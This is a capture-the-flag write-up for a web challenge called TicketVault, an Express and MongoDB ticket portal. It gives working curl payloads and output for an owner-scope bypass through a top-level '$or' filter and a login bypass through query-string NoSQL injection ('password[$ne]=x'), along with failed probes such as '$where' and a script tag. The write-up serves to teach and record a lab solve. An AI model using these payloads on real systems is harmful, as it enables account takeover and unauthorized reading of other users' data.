---
title: "TicketVault"
category: "Web"
tags: ["web", "nosql-injection", "mongodb", "express", "scope-bypass", "query-parser"]
solve_date: "2026-10-08T01:57:00+07:00"
language: "en"
points: 78
---

# TicketVault — owner-scope escape and login NoSQL injection

**Flag:** `CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}` · **Files:** `server.js` (3 163 B, sha256 `40a3b56881a34b7171638df9a4e7e95e6fe73c662bd11b1f8d027ab133a06e2e`), `package.json` (268 B, sha256 `c682ada16024da8184c6a7af5890791c2476aed80ec1bc0687f217cda9c34fe2`) · **Target:** `144.217.91.111:3001`

The flag was read from the admin ticket through the two paths below.

## Challenge

TicketVault is a small internal support portal: every user creates and views their own tickets. The admin's
inbox holds the post-mortem for a recent incident, "but obviously, you're not supposed to be able to read it".
The challenge ships `server.js` and `package.json`; the service runs at `144.217.91.111:3001`. Objective: read
the ticket belonging to `admin`.

## Analysis

`server.js` is a compact 99 lines with four routes: `/register`, `/login`, `/tickets` (GET/POST) and
`/tickets/search`. The first thing worth noticing is not the code that is there, but the code that is
missing - three modules are `require`d but never provided:

```js
const { connect, getDb } = require('./db');
const { resolveLoginCredentials } = require('./utils/sanitize');
const { buildScopedFilter } = require('./utils/ticketFilter');
```

and they are used in exactly the two most sensitive places:

```js
app.post('/login', async (req, res) => {
  const { username, password } = resolveLoginCredentials(req);
  const user = await db.collection('users').findOne({ username, password });   // value goes straight into the query

app.get('/tickets', requireAuth, async (req, res) => {
  const tickets = await db.collection('tickets').find({ owner: req.session.username }).toArray();  // hard scope

app.get('/tickets/search', requireAuth, async (req, res) => {
  const filter = buildScopedFilter(req);
  const tickets = await db.collection('tickets').find(filter).toArray();       // filter assembled by hidden code
```

Three direct consequences:

- With `mongodb 5.7.0`, if `username`/`password` end up as an **object** rather than a string, the driver
  treats it as an operator (`{"$ne": "x"}`) - a possible NoSQL injection vector. The whole question is whether
  `resolveLoginCredentials` prevents that, and which input channel it reads from.
- `/tickets/search` is the only place where the owner scope is assembled by code we cannot read, which makes
  it the prime candidate for scope escape. `/tickets` uses the owner filter directly in the provided source.
- Express 4 defaults to `query parser: extended`, so `req.query` is parsed by `qs` as well and **builds nested
  objects** from `password[$ne]=x` syntax. That input channel has to be tested separately from the body.

## Approaches tried

The following experiments are recorded in `notes.md`:

1. **Overriding the `owner` key in the filter**: `filter={"owner":"admin"}` returned exactly one ticket, but its
   `owner` was the logged-in user - the scope overwrites this key.
2. **Operators inside `owner`**: `filter={"owner":{"$ne":"__nope__"}}` still returned only my own tickets - this
   shape keeps the AND relation with the scope.
3. **`$where` (JavaScript execution)**: `filter={"$where":"this.owner==='admin'"}` produced 0 tickets (a separate
   probe batch returned 502 for the same payload). This payload did not yield a useful result; these responses do not prove that JavaScript was not executed.
4. **NoSQL injection at `/login` through a JSON body**: `{"username":"admin","password":{"$ne":"x"}}` returned
   HTTP 503 with no session.
5. **NoSQL injection at `/login` mixing query and body**: `?password[$ne]=x` together with a body of
   `username=admin&password=zzz` returned HTTP 200 "Invalid credentials" - when a body is present the
   credentials come from the body and the query is ignored. Eliminated in that form.
6. **Nested query on the `q` parameter**: `q[$ne]=zzz` returned HTTP 502.
7. **XSS/SSTI through `subject`/`content`**: a ticket containing `<script>alert(1)</script>` renders escaped as
   `&lt;script&gt;...` - EJS default escaping is active.

The tested `owner` forms remain restricted to the current account. With no source for `buildScopedFilter`, test top-level operators and judge authorization by the returned tickets, rather than assuming its exact filter construction.

## Solution

**Step 1 - Get a foot in the door at `/tickets/search` with an ordinary account.** Register a fresh account (the
server requires no verification), then call `/tickets/search` with that session. Baseline: the user has 0-1
tickets and only ever sees its own.

```bash
curl -s -c jar.txt -d 'username=bob2&password=pwpw' http://144.217.91.111:3001/register
curl -s -b jar.txt 'http://144.217.91.111:3001/tickets' | grep -c 'class="ticket"'
```

**Step 2 - Escape the owner scope with a top-level `$or`.** This is the primary path and needs only an ordinary
account:

```bash
curl -s -b jar.txt -G --data-urlencode 'filter={"$or":[{"owner":"admin"}]}' \
  http://144.217.91.111:3001/tickets/search
```

```text
HTTP 200, 1 ticket (owner = admin)
owner='admin' subject='Root cause analysis - incident 2024-03'
content='Postmortem notes for the March incident. Access recovery token: CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}'
```

The `$or` payload returns an admin-owned ticket to an ordinary session. This demonstrates an owner-scope bypass for that payload, but does not establish the final query or the hidden module’s exact implementation.

**Step 3 - Broaden the `$or` condition to check the access scope.** Change the clause to `{"owner":{"$exists":true}}`:

```bash
curl -s -b jar.txt -G --data-urlencode 'filter={"$or":[{"owner":{"$exists":true}}]}' \
  http://144.217.91.111:3001/tickets/search
```

```text
HTTP 200, 362 tickets (the whole tickets collection)
```

The 362 results show access to multiple owners with this condition. This
dump touches other users' tickets, so this writeup keeps only the admin ticket; the other owners' content was
cut from `exploit-output.txt`.

**Step 4 - A second primitive: NoSQL injection at `/login` through the query string.** To read the inbox as a
real admin session, exploit `resolveLoginCredentials`. The lesson from item 5 above: **do not send a body**. Put
the credentials purely in the query:

```bash
curl -s -i -c admin.jar -X POST \
  'http://144.217.91.111:3001/login?username=admin&password[$ne]=x'
curl -s -b admin.jar http://144.217.91.111:3001/tickets
```

```text
HTTP 302  Location: /tickets
...
owner='admin' subject='Root cause analysis - incident 2024-03'
content='Postmortem notes for the March incident. Access recovery token: CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}'
```

`qs` parses `password[$ne]=x` into `{"$ne": "x"}`; `resolveLoginCredentials` hands that object straight to
`findOne({username, password})`, so the query becomes "find user `admin` whose password differs from `x`" provided the stored password differs from `x`. Compared with items 4 and 5: an operator inside the body is blocked (503), while simply
**switching the input channel to the query** slips through. The responses show different handling of those input channels; the unavailable module source prevents a precise claim about which fields its sanitizer visits.

**Step 5 - Verification.** The two primitives go through two different hidden modules
(`utils/ticketFilter` for Step 2, `utils/sanitize` for Step 4), two different routes and two different privilege
levels (ordinary user vs admin session), yet both yield the same value - and that value lives in a ticket that
`GET /tickets` for an ordinary user never lists. `solve.py` prints both and compares them:

```text
Got from path A: ['CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}']
Got from path B: ['CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}']
Both paths agree: ['CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}']
```

## Result

```bash
python solve.py
```

```text
[A] POST /login?username=admin&password[$ne]=x (no body) -> HTTP 302 Location /tickets
    owner='admin' subject='Root cause analysis - incident 2024-03'
    content='Postmortem notes for the March incident. Access recovery token: CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}'
[B] filter admin          -> HTTP 200, 1 ticket (of which mine: 0)
    owner='admin' subject='Root cause analysis - incident 2024-03'
    content='Postmortem notes for the March incident. Access recovery token: CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}'
[B] filter whole DB       -> HTTP 200, 362 tickets (of which mine: 0)
FLAG: CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}
```

## Reproduce

The service must still be live at `144.217.91.111:3001` (this challenge has no offline artifact that could be
re-solved independently).

```bash
python solve.py
```

The script registers a fresh user, runs both paths, prints the admin ticket and the recovered flag; sample output
is in `exploit-output.txt`. To do it by hand, the four `curl` commands in Steps 1-4 are sufficient, in
that order: register an ordinary user -> `/tickets/search` with `$or` -> widen the `$or` to confirm the mechanism
-> `/login` **query-only** to obtain an admin session.
